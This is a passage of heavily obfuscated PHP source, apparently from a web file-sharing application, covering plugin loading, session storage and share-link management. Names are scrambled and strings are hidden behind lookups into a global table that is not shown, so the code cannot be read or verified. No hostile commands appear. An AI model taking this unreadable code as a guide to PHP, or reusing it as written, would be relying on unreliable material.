$this->loadPluginList(); $Ê¡ˆ÷°¹ = array(); foreach ($êñˆÉ‚ó as $™½¦‚ => $„Õ°ÜË¸) { $Ïˆœ‘èÕ = $„Õ°ÜË¸; unset($„Õ°ÜË¸[$î‚…š†[2020]], $„Õ°ÜË¸[$î‚…š†[6]]); $öşÔà«° = PLUGIN_DIR . $„Õ°ÜË¸[$î‚…š†[32]] . $î‚…š†[2022]; if (!is_file($öşÔà«°)) { continue; } $ÇªÁî½ = Hook::apply($„Õ°ÜË¸[$î‚…š†[32]] . $î‚…š†[2030]); if (!is_array($ÇªÁî½)) { continue; } $Ê¡ˆ÷°¹[$™½¦‚] = array_merge($„Õ°ÜË¸, $ÇªÁî½); if ($Ïˆœ‘èÕ[$î‚…š†[6]][$î‚…š†[1616]] != $ÇªÁî½[$î‚…š†[1590]]) { Hook::apply($„Õ°ÜË¸[$î‚…š†[32]] . $î‚…š†[2027]); $Ïˆœ‘èÕ[$î‚…š†[6]][$î‚…š†[1616]] = $ÇªÁî½[$î‚…š†[1590]]; $this->update($„Õ°ÜË¸[$î‚…š†[445]], array($î‚…š†[6] => $Ïˆœ‘èÕ[$î‚…š†[6]])); } } return $Ê¡ˆ÷°¹; } private function loadPluginList() { $µÜ¥ß‹ =& $_SERVER[ò«¥Ê‡å]; $ÀÎÔò€¸ = $this->loadList(); if (strtolower(MOD) == $µÜ¥ß‹[2031]) { return $ÀÎÔò€¸; } $Ì¾¨ù = Hook::trigger($µÜ¥ß‹[2032], $ÀÎÔò€¸); if ($ÀÎÔò€¸ && !$Ì¾¨ù) { die; } return $Ì¾¨ù ? $Ì¾¨ù : $ÀÎÔò€¸; } private function pluginScan($ôÎ·ø×£) { $Ê¯Îø³ê =& $_SERVER[ò«¥Ê‡å]; recursion_dir(PLUGIN_DIR, $ø÷Â½Šë, $¡²ı¥©, 0); foreach ($ø÷Â½Šë as $ö¦Ù×ú) { $»ù²ı±  = get_path_this($ö¦Ù×ú); if (isset($ôÎ·ø×£[$»ù²ı± ]) || !file_exists($ö¦Ù×ú . $Ê¯Îø³ê[2033]) || !file_exists($ö¦Ù×ú . $Ê¯Îø³ê[2022])) { continue; } Hook::apply($»ù²ı±  . $Ê¯Îø³ê[2027]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\137\x73\x65\163\x73\x69\157\156"; public function get($¦øüšÛ) { $ıñÎÓïû =& $_SERVER[ò«¥Ê‡å]; $¥ĞÉ×©« = $this->where(array($ıñÎÓïû[2034] => $¦øüšÛ))->find(); if (!is_array($¥ĞÉ×©«)) { return !1; } return $¥ĞÉ×©«[$ıñÎÓïû[793]]; } public function set($Íš•·ŸÌ, $ğô‚²´Š, $±ãŞ = 3600) { $ÔÊÚ³€î =& $_SERVER[ò«¥Ê‡å]; $×ÏÔ¼°ü = array($ÔÊÚ³€î[2034] => $Íš•·ŸÌ, $ÔÊÚ³€î[1938] => $ğô‚²´Š, $ÔÊÚ³€î[2035] => $±ãŞ + time()); if (Session::get($ÔÊÚ³€î[2036])) { $×ÏÔ¼°ü[$ÔÊÚ³€î[1701]] = Session::get($ÔÊÚ³€î[2036]); } else { $×ÏÔ¼°ü[$ÔÊÚ³€î[1701]] = 0; } if ($this->get($Íš•·ŸÌ)) { return $this->where(array($ÔÊÚ³€î[2034] => $Íš•·ŸÌ))->save($×ÏÔ¼°ü); } else { return $this->add($×ÏÔ¼°ü, array(), !0); } } public function remove($·­½¡ßÚ) { return $this->where(array($_SERVER[ò«¥Ê‡å][2034] => $·­½¡ßÚ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ò«¥Ê‡å][2037] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\164\54\165\x70\144\141\x74\x65", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\x72\x65\141\164\145\124\x69\155\145", "\x74\151\155\x65", "\x69\x6e\x73\x65\x72\x74", "\x66\x75\156\143\x74\151\x6f\156"), array("\157\x70\x74\x69\x6f\x6e\x73", '', "\151\x6e\163\x65\x72\x74\x2c\x75\160\x64\x61\x74\145\x2c\x73\145\x6c\145\x63\x74", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ô¶š›ç“) { $ªÂ×è¯… =& $_SERVER[ò«¥Ê‡å]; $õùÇøŠá = isset($Ô¶š›ç“[0]) ? $Ô¶š›ç“[0] : !1; return array($ªÂ×è¯…[2038] => array(USER_ID, $ªÂ×è¯…[2039]), $ªÂ×è¯…[1979] => array($õùÇøŠá, $ªÂ×è¯…[2040])); } protected function listSimple() { $•¢ƒß‘ = array($_SERVER[ò«¥Ê‡å][1701] => USER_ID); $ÌÉ’¤¼ = $this->field($this->fieldList)->where($•¢ƒß‘)->select(); return $ÌÉ’¤¼ ? $ÌÉ’¤¼ : array(); } protected function getInfo($ãŒ¶µ³Ì, $×®‘œ¼ò = false) { $Ë™ƒÕè =& $_SERVER[ò«¥Ê‡å]; if ($×®‘œ¼ò) { return $this->_getShareInfo(array($Ë™ƒÕè[635] => $ãŒ¶µ³Ì)); } $ŸïÇŸ‰Ó = $this->cacheFunctionGet($Ë™ƒÕè[1981], $ãŒ¶µ³Ì); return $ŸïÇŸ‰Ó; } public function getInfoByHash($ÍÎ˜îèÌ) { return $this->_getShareInfo(array($_SERVER[ò«¥Ê‡å][2041] => $ÍÎ˜îèÌ)); } public function getInfoByPath($©Â®åë‡) { $¯™·àŸ× =& $_SERVER[ò«¥Ê‡å]; $¯îŒèÒ = array($¯™·àŸ×[1701] => USER_ID, $¯™·àŸ×[183] => $©Â®åë‡); return $this->_getShareInfo($¯îŒèÒ); } public function getInfoBySourcePath($µÌ®é×–) { $¸Û½×Íµ =& $_SERVER[ò«¥Ê‡å]; $û·ÏÁöñ = array($¸Û½×Íµ[1701] => USER_ID, $¸Û½×Íµ[1222] => $µÌ®é×–); return $this->_getShareInfo($û·ÏÁöñ); } private function _getShareInfo($ô”¿Œƒâ) { $ƒ…ı× =& $_SERVER[ò«¥Ê‡å]; $¯§Í«Ş¯ = $this->where($ô”¿Œƒâ)->find(); if (!$¯§Í«Ş¯) { return !1; } $ô”¿Œƒâ = array($ƒ…ı×[635] => $¯§Í«Ş¯[$ƒ…ı×[635]]); $§Àà›Æ = $ƒ…ı×[2042]; $¶Û¨µÊÉ = Model($ƒ…ı×[636])->order($ƒ…ı×[445])->field($§Àà›Æ)->where($ô”¿Œƒâ)->select(); if ($¯§Í«Ş¯[$ƒ…ı×[183]] == $ƒ…ı×[214]) { $¯§Í«Ş¯[$ƒ…ı×[89]] = IO::info($¯§Í«Ş¯[$ƒ…ı×[1222]]); } else { $¯§Í«Ş¯[$ƒ…ı×[89]] = Model($ƒ…ı×[1380])->pathInfo($¯§Í«Ş¯[$ƒ…ı×[183]]); } $¯§Í«Ş¯[$ƒ…ı×[2043]] = $¶Û¨µÊÉ; return $¯§Í«Ş¯; } protected function getInfoAuth($¯×ñûÎô) { $ëÖ›•Ôº =& $_SERVER[ò«¥Ê‡å]; $ô’¢¹Ê = $this->getInfo($¯×ñûÎô); if ($ô’¢¹Ê[$ëÖ›•Ôº[1701]] == USER_ID) { $ô’¢¹Ê[$ëÖ›•Ôº[457]] = $ô’¢¹Ê[$ëÖ›•Ôº[89]][$ëÖ›•Ôº[457]]; } else { $ô’¢¹Ê[$ëÖ›•Ôº[457]] = Model($ëÖ›•Ôº[538])->authMake($ô’¢¹Ê[$ëÖ›•Ôº[2043]]); } return $ô’¢¹Ê; } protected function listData($œ©ÂÜùí = null, $éÖ‹’“É = 300) { $ßÆå­ÖÀ =& $_SERVER[ò«¥Ê‡å]; $ŞØØšĞÌ = array(array($ßÆå­ÖÀ[533] => array($ßÆå­ÖÀ[1059], 0), $ßÆå­ÖÀ[633] => array($ßÆå­ÖÀ[1059], 0), $ßÆå­ÖÀ[2044] => $ßÆå­ÖÀ[1997])); if ($œ©ÂÜùí == $ßÆå­ÖÀ[2045]) { $ŞØØšĞÌ = array($ßÆå­ÖÀ[533] => 1); } else { if ($œ©ÂÜùí == $ßÆå­ÖÀ[1208]) { $ŞØØšĞÌ = array($ßÆå­ÖÀ[633] => 1); } } $ŞØØšĞÌ[$ßÆå­ÖÀ[1701]] = USER_ID; $¸Á÷©ê = $this->where($ŞØØšĞÌ)->selectPage($éÖ‹’“É); return $¸Á÷©ê; } protected function listToMe($ßËìİó = 300) { $¸òˆŸï¾ =& $_SERVER[ò«¥Ê‡å]; $×áÈìÅÖ = Model($¸òˆŸï¾[2046])->userGroupParents(USER_ID); $¨êÍ€—í = array($¸òˆŸï¾[618] => SourceModel::TYPE_USER, $¸òˆŸï¾[540] => USER_ID); if ($×áÈìÅÖ) { $¨êÍ€—í = array(array($¸òˆŸï¾[618] => SourceModel::TYPE_USER, $¸òˆŸï¾[540] => USER_ID), array($¸òˆŸï¾[618] => SourceModel::TYPE_GROUP, $¸òˆŸï¾[540] => array($¸òˆŸï¾[7], $×áÈìÅÖ)), $¸òˆŸï¾[2044] => $¸òˆŸï¾[1997]); } $Â·Ÿáå” = Model($¸òˆŸï¾[636])->where($¨êÍ€—í)->selectPage($ßËìİó); $„ßŞ·Çï = array_to_keyvalue_group($Â·Ÿáå”[$¸òˆŸï¾[415]], $¸òˆŸï¾[635]); if (!$„ßŞ·Çï) { return $Â·Ÿáå”; } $—÷àÑî¥ = $¸òˆŸï¾[2047]; $¨êÍ€—í = array($¸òˆŸï¾[635] => array($¸òˆŸï¾[462], array_keys($„ßŞ·Çï)), $¸òˆŸï¾[1701] => array($¸òˆŸï¾[1061], $¸òˆŸï¾[214])); $½¢Ã»Ôş = $this->field($—÷àÑî¥)->where($¨êÍ€—í)->select(); foreach ($½¢Ã»Ôş as $¶íãœµ => &$ÌÃØİÊ) { $ÌÃØİÊ[$¸òˆŸï¾[2043]] = $„ßŞ·Çï[$ÌÃØİÊ[$¸òˆŸï¾[635]]]; } unset($ÌÃØİÊ); $åÆ”¢Ÿ = array($¸òˆŸï¾[2048] => $½¢Ã»Ôş, $¸òˆŸï¾[2049] => $Â·Ÿáå”[$¸òˆŸï¾[412]]); return $åÆ”¢Ÿ; } protected function shareAdd($Ú¤Ğ×Ã, $ª•Ó­Êğ) { $‹ù¾ÍÜÛ =& $_SERVER[ò«¥Ê‡å]; $‘Î½¶ûä = $this->_addShareData($Ú¤Ğ×Ã, $ª•Ó­Êğ); if (!empty($ª•Ó­Êğ[$‹ù¾ÍÜÛ[2050]])) { $this->_shareAuthSet($‘Î½¶ûä, $ª•Ó­Êğ[$‹ù¾ÍÜÛ[2050]]); } $this->shareEventAdd($Ú¤Ğ×Ã, $ª•Ó­Êğ, $‹ù¾ÍÜÛ[2051]); return $‘Î½¶ûä; } protected function shareAddSystem($¢²«Ğß, $õÒÖ ™Ë) { $à–°šŠ¦ =& $_SERVER[ò«¥Ê‡å]; $ä ô³Ã• = $this->_addShareData($¢²«Ğß, $õÒÖ ™Ë, $à–°šŠ¦[181]); $this->_shareAuthSet($ä ô³Ã•, $õÒÖ ™Ë[$à–°šŠ¦[2050]]); return $ä ô³Ã•; } private function shareEventAdd($ŸÈâÒœˆ, $¡²ˆò‡™, $Ÿ´ˆÓø = "\x61\x64\144") { $³ÔÜ‡ø¥ =& $_SERVER[ò«¥Ê‡å]; if (!$ŸÈâÒœˆ || $ŸÈâÒœˆ == $³ÔÜ‡ø¥[214]) { return; } if ($Ÿ´ˆÓø == $³ÔÜ‡ø¥[2051]) { if ($¡²ˆò‡™[$³ÔÜ‡ø¥[533]] == $³ÔÜ‡ø¥[90]) { Model($³ÔÜ‡ø¥[603])->eventShare($ŸÈâÒœˆ, $³ÔÜ‡ø¥[2052]); } if ($¡²ˆò‡™[$³ÔÜ‡ø¥[633]] == $³ÔÜ‡ø¥[90]) { Model($³ÔÜ‡ø¥[603])->eventShare($ŸÈâÒœˆ, $³ÔÜ‡ø¥[2053]); } return; } $„Î“’»€ = $this->getInfoByPath($ŸÈâÒœˆ); $¢°Ôç‚» = $³ÔÜ‡ø¥[2054]; if ($„Î“’»€[$³ÔÜ‡ø¥[533]] == $³ÔÜ‡ø¥[214] && $¡²ˆò‡™[$³ÔÜ‡ø¥[533]] == $³ÔÜ‡ø¥[90]) { $¢°Ôç‚» = $³ÔÜ‡ø¥[2052]; } if ($„Î“’»€[$³ÔÜ‡ø¥[533]] == $³ÔÜ‡ø¥[90] && $¡²ˆò‡™[$³ÔÜ‡ø¥[533]] == $³ÔÜ‡ø¥[214]) { $¢°Ôç‚» = $³ÔÜ‡ø¥[2055]; } if ($„Î“’»€[$³ÔÜ‡ø¥[633]] == $³ÔÜ‡ø¥[214] && $¡²ˆò‡™[$³ÔÜ‡ø¥[633]] == $³ÔÜ‡ø¥[90]) { $¢°Ôç‚» = $³ÔÜ‡ø¥[2053]; } if ($„Î“’»€[$³ÔÜ‡ø¥[633]] == $³ÔÜ‡ø¥[90] && $¡²ˆò‡™[$³ÔÜ‡ø¥[633]] == $³ÔÜ‡ø¥[214]) { $¢°Ôç‚» = $³ÔÜ‡ø¥[2056]; } Model($³ÔÜ‡ø¥[603])->eventShare($ŸÈâÒœˆ, $¢°Ôç‚»); return; } private function _addShareData($æß°ÒäÈ, $Ş™Ûå©£ = array(), $—âËÀõ = false) { $‰˜©Èğ± =& $_SERVER[ò«¥Ê‡å]; $½ëÍ¿ÏÔ = $—âËÀõ == $‰˜©Èğ±[181] ? 0 : USER_ID; $£Ÿ¦•… = array($‰˜©Èğ±[461] => $æß°ÒäÈ, $‰˜©Èğ±[1692] => $½ëÍ¿ÏÔ); if ($æß°ÒäÈ == 0) { $£Ÿ¦•… = array($‰˜©Èğ±[2057] => $Ş™Ûå©£[$‰˜©Èğ±[1222]], $‰˜©Èğ±[1692] => $½ëÍ¿ÏÔ); } if ($¥£ıÂå = $this->where($£Ÿ¦•…)->find()) { return $¥£ıÂå[$‰˜©Èğ±[635]]; } if ($æß°ÒäÈ == 0) { $Ö‹ÕÆ½› = array($‰˜©Èğ±[32] => get_path_this($Ş™Ûå©£[$‰˜©Èğ±[86]])); } else { $Ö‹ÕÆ½› = Model($‰˜©Èğ±[871])->sourceInfo($æß°ÒäÈ); if (!$Ö‹ÕÆ½›) { return !1; } } if (!$Ş™Ûå©£[$‰˜©Èğ±[1591]]) { $Ş™Ûå©£[$‰˜©Èğ±[1591]] = $Ö‹ÕÆ½›[$‰˜©Èğ±[32]]; } $Ö”­ªÉò = array($‰˜©Èğ±[1692] => $½ëÍ¿ÏÔ, $‰˜©Èğ±[461] => $æß°ÒäÈ, $‰˜©Èğ±[1591] => $‰˜©Èğ±[12], $‰˜©Èğ±[533] => 0, $‰˜©Èğ±[633] => 0, $‰˜©Èğ±[1222] => $‰˜©Èğ±[12], $‰˜©Èğ±[353] => $‰˜©Èğ±[12], $‰˜©Èğ±[936] => $‰˜©Èğ±[12], $‰˜©Èğ±[2058] => 0, $‰˜©Èğ±[2059] => 0, $‰˜©Èğ±[800] => 0, $‰˜©Èğ±[2060] => $‰˜©Èğ±[12], $‰˜©Èğ±[2041] => $‰˜©Èğ±[12]); $ÌäÖ‹—¤ = explode($‰˜©Èğ±[50], $‰˜©Èğ±[2061]); foreach ($ÌäÖ‹—¤ as $«şš€ïÎ) { if (!isset($Ş™Ûå©£[$«şš€ïÎ])) { continue; } $Ö”­ªÉò[$«şš€ïÎ] = $Ş™Ûå©£[$«şš€ïÎ]; } $Äâé“÷ç = $this->add($Ö”­ªÉò); $–üŸıôé = array($‰˜©Èğ±[2041] => short_id($Äâé“÷ç)); $this->where(array($‰˜©Èğ±[2062] => $Äâé“÷ç))->save($–üŸıôé); return $Äâé“÷ç; } private function _shareAuthSet($¨Ç“ŠĞÀ, $Œ’»ÂÎ’) { $°¯¸êÏñ =& $_SERVER[ò«¥Ê‡å]; if (!is_array($Œ’»ÂÎ’)) { return !1; } $Ïº½ı¯Ó = Model($°¯¸êÏñ[2007]); $Ïº½ı¯Ó->where(array($°¯¸êÏñ[635] => $¨Ç“ŠĞÀ))->delete(); $™´³¬¨ö = array(); foreach ($Œ’»ÂÎ’ as $ŠÙ¹¦¿Ì) { $”Œ÷‚œ = SourceModel::TYPE_USER; if ($ŠÙ¹¦¿Ì[$°¯¸êÏñ[180]] == SourceModel::TYPE_GROUP) { $”Œ÷‚œ = SourceModel::TYPE_GROUP; } $Ìùãº¤­ = array($°¯¸êÏñ[635] => $¨Ç“ŠĞÀ, $°¯¸êÏñ[180] => $”Œ÷‚œ, $°¯¸êÏñ[540] => intval($ŠÙ¹¦¿Ì[$°¯¸êÏñ[540]]), $°¯¸êÏñ[2003] => 0, $°¯¸êÏñ[2063] => -1); if ($ŠÙ¹¦¿Ì[$°¯¸êÏñ[2003]]) { $Ìùãº¤­[$°¯¸êÏñ[2003]] = $ŠÙ¹¦¿Ì[$°¯¸êÏñ[2003]]; } else { if ($ŠÙ¹¦¿Ì[$°¯¸êÏñ[2063]]) { $Ìùãº¤­[$°¯¸êÏñ[2063]] = $ŠÙ¹¦¿Ì[$°¯¸êÏñ[2063]]; } } $™´³¬¨ö[] = $Ìùãº¤­; } return $Ïº½ı¯Ó->addAll($™´³¬¨ö, array(), !0); } public function numViewAdd($‹ŒÙµûÍ) { $éçûÈúœ =& $_SERVER[ò«¥Ê‡å]; $²Ü˜ß²µ = array($éçûÈúœ[2062] => $‹ŒÙµûÍ); $this->where($²Ü˜ß²µ)->setAdd($éçûÈúœ[2058]); } public function numDownloadAdd($ÑÇÙ¼É) { $™¨¨Ç‹” =& $_SERVER[ò«¥Ê‡å]; $£ù±² = array($™¨¨Ç‹”[2062] => $ÑÇÙ¼É); $this->where($£ù±²)->setAdd($™¨¨Ç‹”[2059]); } protected function shareEdit($ó±·ú‰í, $îºÙí¸ó) { $î–èö³Ñ =& $_SERVER[ò«¥Ê‡å]; $ï•ÍÇ™å = $this->getInfo($ó±·ú‰í); if (!$ï•ÍÇ™å) { return !1; } $this->_checkLinkShare($îºÙí¸ó, $ï•ÍÇ™å); $˜êüŸ”” = array(); $í®®ÀÇ¶ = explode($î–èö³Ñ[50], $î–èö³Ñ[2064]); foreach ($í®®ÀÇ¶ as $«‘Ñ¿Úˆ) { if (!array_key_exists($«‘Ñ¿Úˆ, $îºÙí¸ó)) { continue; } $˜êüŸ””[$«‘Ñ¿Úˆ] = $îºÙí¸ó[$«‘Ñ¿Úˆ]; } $this->shareEventAdd($ï•ÍÇ™å[$î–èö³Ñ[183]], $îºÙí¸ó, $î–èö³Ñ[1869]); $this->where(array($î–èö³Ñ[2062] => $ó±·ú‰í))->save($˜êüŸ””); if (isset($îºÙí¸ó[$î–èö³Ñ[2050]])) { $this->_shareAuthSet($ó±·ú‰í, $îºÙí¸ó[$î–èö³Ñ[2050]]); } return !0; } private function _checkLinkShare($ˆ£ ¯”Î, $ºê§¡ó) { $í¯áÚ¤Š =& $_SERVER[ò«¥Ê‡å]; if ($ˆ£ ¯”Î[$í¯áÚ¤Š[533]] != $í¯áÚ¤Š[90]) { return; } $œºşŠı¯ = $ºê§¡ó[$í¯áÚ¤Š[89]][$í¯áÚ¤Š[183]]; if ($ºê§¡ó[$í¯áÚ¤Š[89]][$í¯áÚ¤Š[33]] != $í¯áÚ¤Š[216]) { $¬ ÛüŸ = $this->_folderReport($œºşŠı¯); if (!$¬ ÛüŸ) { return; } show_json(LNG($í¯áÚ¤Š[2065]) . $í¯áÚ¤Š[2066] . $¬ ÛüŸ, !1); } $—Š»Õ–Ì = Model($í¯áÚ¤Š[871])->fileInfoGet($ºê§¡ó[$í¯áÚ¤Š[89]][$í¯áÚ¤Š[183]]); if (!$—Š»Õ–Ì) { return; } $«€ä¼´Ó = $this->shareFileMeta($—Š»Õ–Ì[$í¯áÚ¤Š[511]]); if (isset($«€ä¼´Ó[$í¯áÚ¤Š[420]]) && $«€ä¼´Ó[$í¯áÚ¤Š[420]] == $í¯áÚ¤Š[90]) { show_json(LNG($í¯áÚ¤Š[2067]), !1); } } private function _folderReport($ç™ç¯²…) { $¾Ä÷Œ² =& $_SERVER[ò«¥Ê‡å]; $‰ÉÆ™» = array($¾Ä÷Œ²[511] => array($¾Ä÷Œ²[1059], 0), $¾Ä÷Œ²[789] => 3); $ò¦ŠÈº½ = Model($¾Ä÷Œ²[2068])->where($‰ÉÆ™»)->field($¾Ä÷Œ²[511])->select(); if (!$ò¦ŠÈº½) { return !1; } $ò¦ŠÈº½ = array_to_keyvalue($ò¦ŠÈº½, $¾Ä÷Œ²[12], $¾Ä÷Œ²[511]); $ıñ´Á¡º = $¾Ä÷Œ²[50] . $ç™ç¯²… . $¾Ä÷Œ²[50]; $‰ÉÆ™» = array($¾Ä÷Œ²[511] => array($¾Ä÷Œ²[7], $ò¦ŠÈº½), $¾Ä÷Œ²[555] => array($¾Ä÷Œ²[429], "\45{$ıñ´Á¡º}\45"), $¾Ä÷Œ²[475] => 0); $³¢ı’Ö = Model($¾Ä÷Œ²[871])->where($‰ÉÆ™»)->field($¾Ä÷Œ²[2069])->find(); if (!$³¢ı’Ö) { return !1; } $Î¥‹³ÓÚ = substr($³¢ı’Ö[$¾Ä÷Œ²[555]], strpos($³¢ı’Ö[$¾Ä÷Œ²[555]], $ıñ´Á¡º)); $‰ÉÆ™» = array($¾Ä÷Œ²[183] => array($¾Ä÷Œ²[7], trim($Î¥‹³ÓÚ, $¾Ä÷Œ²[50]))); $•‹€Ôš« = Model($¾Ä÷Œ²[871])->where($‰ÉÆ™»)->field($¾Ä÷Œ²[32])->select(); $˜Ù†ªáŒ = array_to_keyvalue($•‹€Ôš«, $¾Ä÷Œ²[12], $¾Ä÷Œ²[32]); $˜Ù†ªáŒ[] = $³¢ı’Ö[$¾Ä÷Œ²[32]]; return implode($¾Ä÷Œ²[8], $˜Ù†ªáŒ); } protected function remove($á´™¬ï) { $­àÏ™Å =& $_SERVER[ò«¥Ê‡å]; if (is_array($á´™¬ï)) { $á´™¬ï = array($­àÏ™Å[7], $á´™¬ï); } $Ûª€ÓùÔ = array($­àÏ™Å[635] => $á´™¬ï); $¸Äµßê = $this->where($Ûª€ÓùÔ)->delete(); if ($¸Äµßê) { Model($­àÏ™Å[636])->where(array($­àÏ™Å[635] => $á´™¬ï))->delete(); } $¸ ·îø÷ = is_array($á´™¬ï) ? $á´™¬ï[1] : array($á´™¬ï); for ($ÓÂ„…±Â = 0; $ÓÂ„…±Â < count($¸ ·îø÷); $ÓÂ„…±Â++) { $Æõ¹–«– = $this->getInfo($¸ ·îø÷[$ÓÂ„…±Â]); if ($Æõ¹–«–[$­àÏ™Å[633]] == $­àÏ™Å[90]) { Model($­àÏ™Å[603])->eventShare($Æõ¹–«–[$­àÏ™Å[183]], $­àÏ™Å[2056]); } if ($Æõ¹–«–[$­àÏ™Å[533]] == $­àÏ™Å[90]) { Model($­àÏ™Å[603])->eventShare($Æõ¹–«–[$­àÏ™Å[183]], $­àÏ™Å[2055]); } } return $¸Äµßê; } protected function removeBySource($¿ÎµÂ„) { $œ‚Û¼Ú¾ =& $_SERVER[ò«¥Ê‡å]; $ÎÄ–Åá = array($œ‚Û¼Ú¾[461] => array($œ‚Û¼Ú¾[462], $¿ÎµÂ„)); $ñáÅáŸ¦ = $this->field($œ‚Û¼Ú¾[635])->where($ÎÄ–Åá)->select(); $ñáÅáŸ¦ = array_to_keyvalue($ñáÅáŸ¦, $œ‚Û¼Ú¾[12], $œ‚Û¼Ú¾[635]); if (!$ñáÅáŸ¦) { return; } $ÎÄ–Åá = array($œ‚Û¼Ú¾[2062] => array($œ‚Û¼Ú¾[462], $ñáÅáŸ¦)); $this->where($ÎÄ–Åá)->delete(); Model($œ‚Û¼Ú¾[636])->where($ÎÄ–Åá)->delete(); } public function listAll($ŞŸúï©é) { $š¤˜î™Æ =& $_SERVER[ò«¥Ê‡å]; $Ş¢…ôÔ¦ = array(); if ($ŞŸúï©é[$š¤˜î™Æ[1701]]) { $Ş¢…ôÔ¦[$š¤˜î™Æ[1701]] = $ŞŸúï©é[$š¤˜î™Æ[1701]]; } if ($ŞŸúï©é[$š¤˜î™Æ[799]]) { $´óšø‰¡ = $ŞŸúï©é[$š¤˜î™Æ[800]] ? $ŞŸúï©é[$š¤˜î™Æ[800]] : strtotime(date($š¤˜î™Æ[2070])); $Ş¢…ôÔ¦[$š¤˜î™Æ[217]] = array($š¤˜î™Æ[379], array($ŞŸúï©é[$š¤˜î™Æ[799]], $´óšø‰¡)); } if ($ŞŸúï©é[$š¤˜î™Æ[33]]) { $Ş¢…ôÔ¦[$ŞŸúï©é[$š¤˜î™Æ[33]]] = 1; } else { $Ş¢…ôÔ¦[] = array($š¤˜î™Æ[533] => array($š¤˜î™Æ[1059], 0), $š¤˜î™Æ[633] => array($š¤˜î™Æ[1059], 0), $š¤˜î™Æ[2044] => $š¤˜î™Æ[1997]); } if ($ŞŸúï©é[$š¤˜î™Æ[1993]]) { $Ş¢…ôÔ¦[] = array($š¤˜î™Æ[2041] => $ŞŸúï©é[$š¤˜î™Æ[1993]], $š¤˜î™Æ[1591] => array($š¤˜î™Æ[429], "\x25{$ŞŸúï©é[$š¤˜î™Æ[1993]]}\x25"), $š¤˜î™Æ[2044] => $š¤˜î™Æ[1997]); } $¿•²¸ƒ = $this->_makeOrder()->where($Ş¢…ôÔ¦)->selectPage(20); if (empty($¿•²¸ƒ[$š¤˜î™Æ[415]])) { return array(); } $this->_listDataApply($¿•²¸ƒ[$š¤˜î™Æ[415]]); return $¿•²¸ƒ; } public function listDataApply($ğºÙ‚Àñ) { $this->_listDataApply($ğºÙ‚Àñ); return $ğºÙ‚Àñ; } private function _listDataApply(&$åŒ„ôõÃ) { $ù­ßõá‹ =& $_SERVER[ò«¥Ê‡å]; $Äñßëîù = array_to_keyvalue($åŒ„ôõÃ, $ù­ßõá‹[12], $ù­ßõá‹[1701]); $é³Ü£¥ = Model($ù­ßõá‹[569])->userListInfo(array_unique($Äñßëîù)); $Ğ±§«ğ¸ = array_to_keyvalue($åŒ„ôõÃ, $ù­ßõá‹[12], $ù­ßõá‹[183]); $ë¶’ € = Model($ù­ßõá‹[871])->sourceListInfo($Ğ±§«ğ¸, !0); foreach ($åŒ„ôõÃ as $šî£à„Ë => &$îƒ¢˜™) { $ØÕÈ×Êû = $îƒ¢˜™[$ù­ßõá‹[1701]]; $îƒ¢˜™[$ù­ßõá‹[2071]] = $é³Ü£¥[$ØÕÈ×Êû] ? $é³Ü£¥[$ØÕÈ×Êû] : !1; $ïôíÏç = $îƒ¢˜™[$ù­ßõá‹[183]]; $îƒ¢˜™[$ù­ßõá‹[89]] = $ë¶’ €[$ïôíÏç] ? $ë¶’ €[$ïôíÏç] : !1; if ($îƒ¢˜™[$ù­ßõá‹[89]][$ù­ßõá‹[475]] == $ù­ßõá‹[90]) { unset($åŒ„ôõÃ[$šî£à„Ë]); } if ($îƒ¢˜™[$ù­ßõá‹[89]] != $ù­ßõá‹[214] && !$îƒ¢˜™[$ù­ßõá‹[89]]) { unset($åŒ„ôõÃ[$šî£à„Ë]); } } unset($îƒ¢˜™); $åŒ„ôõÃ = array_values($åŒ„ôõÃ); } private function _makeOrder($çì©‚§• = '') { $ú•˜®· =& $_SERVER[ò«¥Ê‡å]; $òÊöº®Ê = array($ú•˜®·[217], $ú•˜®·[800], $ú•˜®·[2058], $ú•˜®·[2059]); $˜ûå‚ = array($ú•˜®·[493] => $ú•˜®·[494], $ú•˜®·[495] => $ú•˜®·[496]); $âŸîÊ”¹ = Input::get($ú•˜®·[500], $ú•˜®·[7], $ú•˜®·[467], $òÊöº®Ê); $İ˜¼‘Àä = Input::get($ú•˜®·[501], $ú•˜®·[7], $ú•˜®·[2072], array($ú•˜®·[1990], $ú•˜®·[495])); $İ˜¼‘Àä = $˜ûå‚[$İ˜¼‘Àä]; $çì©‚§• = $çì©‚§• . "{$âŸîÊ”¹}\x20{$İ˜¼‘Àä}"; return $this->order($çì©‚§•); } public function reportAdd($Ê™öãè‘) { $“¤øÄ‡‡ =& $_SERVER[ò«¥Ê‡å]; $„à´ó€° = array($“¤øÄ‡‡[635] => $Ê™öãè‘[$“¤øÄ‡‡[635]], $“¤øÄ‡‡[1701] => USER_ID); if (Model($“¤øÄ‡‡[2068])->where($„à´ó€°)->find()) { return !1; } $üÕÜëˆ = array($“¤øÄ‡‡[635] => $Ê™öãè‘[$“¤øÄ‡‡[635]], $“¤øÄ‡‡[1591] => $Ê™öãè‘[$“¤øÄ‡‡[1591]], $“¤øÄ‡‡[183] => $Ê™öãè‘[$“¤øÄ‡‡[183]], $“¤øÄ‡‡[511] => $Ê™öãè‘[$“¤øÄ‡‡[511]], $“¤øÄ‡‡[1701] => USER_ID, $“¤øÄ‡‡[33] => $Ê™öãè‘[$“¤øÄ‡‡[33]], $“¤øÄ‡‡[496] => $Ê™öãè‘[$“¤øÄ‡‡[496]]); return Model($“¤øÄ‡‡[2068])->add($üÕÜëˆ); } public function reportList($¾¾ËÏÚÏ) { $…Å¹’Œş =& $_SERVER[ò«¥Ê‡å]; $ÖÚöµ½ó = array(); if ($¾¾ËÏÚÏ[$…Å¹’Œş[799]]) { $¥ ôªä = $¾¾ËÏÚÏ[$…Å¹’Œş[800]] ? $¾¾ËÏÚÏ[$…Å¹’Œş[800]] : strtotime(date($…Å¹’Œş[2070])); $ÖÚöµ½ó[$…Å¹’Œş[217]] = array($…Å¹’Œş[379], array($¾¾ËÏÚÏ[$…Å¹’Œş[799]], $¥ ôªä)); } if (isset($¾¾ËÏÚÏ[$…Å¹’Œş[33]]) && 